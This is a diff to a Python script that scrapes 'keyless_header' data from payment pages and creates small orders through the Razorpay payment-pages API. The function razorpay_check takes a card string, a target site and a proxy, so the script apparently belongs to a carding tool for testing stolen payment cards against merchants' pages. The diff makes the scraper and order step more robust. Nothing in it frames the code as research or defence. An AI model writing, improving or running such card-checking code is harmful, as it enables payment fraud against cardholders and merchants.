@@ -124,6 +124,24 @@ def _brace_parse(html: str, start: int):
                 except: return None
     return None
 
+def _deep_find_keyless(obj, depth=0):
+    """Recursively search any nested dict/list for a dict containing keyless_header."""
+    if depth > 15:
+        return None
+    if isinstance(obj, dict):
+        if obj.get('keyless_header'):
+            return obj
+        for v in obj.values():
+            r = _deep_find_keyless(v, depth + 1)
+            if r:
+                return r
+    elif isinstance(obj, list):
+        for item in obj:
+            r = _deep_find_keyless(item, depth + 1)
+            if r:
+                return r
+    return None
+
 def _extract_var_data(html: str):
     # Try var data = {...}
     m = re.search(r'var data\s*=\s*(\{)', html)
@@ -132,21 +150,18 @@ def _extract_var_data(html: str):
         if result:
             return result
 
-    # Try __NEXT_DATA__ (Next.js SSR)
+    # Try __NEXT_DATA__ (Next.js SSR) — search recursively for keyless_header
     m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>', html)
     if m:
         brace_pos = html.find('{', m.end())
         if brace_pos != -1:
             result = _brace_parse(html, brace_pos)
             if result:
-                # Navigate to pageProps.data or pageProps directly
-                page_props = (result.get('props', {}).get('pageProps', {})
-                              or result.get('pageProps', {}))
-                data = page_props.get('data') or page_props.get('pageData') or page_props
-                if isinstance(data, dict) and data:
-                    return data
+                found = _deep_find_keyless(result)
+                if found:
+                    return found
 
-    # Last resort: find keyless_header inline
+    # Last resort: find keyless_header inline via regex
     m = re.search(r'"keyless_header"\s*:\s*"([^"]+)"', html)
     if m:
         keyless = m.group(1)
@@ -236,12 +251,12 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
         async with aiohttp.ClientSession(connector=connector) as s:
 
             # ── Step 1: Create order ────────────────────────────────────────
+            _order_body = {'notes': {'comment': '', 'name': card_name}}
+            if ppid:
+                _order_body['line_items'] = [{'payment_page_item_id': ppid, 'amount': 100}]
             async with s.post(
                 f'{RZ_API}/v1/payment_pages/{plink}/order',
-                json={
-                    'notes':      {'comment': '', 'name': card_name},
-                    'line_items': [{'payment_page_item_id': ppid, 'amount': 100}],
-                },
+                json=_order_body,
                 headers={
                     'Accept':        'application/json, text/plain, */*',
                     'Content-Type':  'application/json',
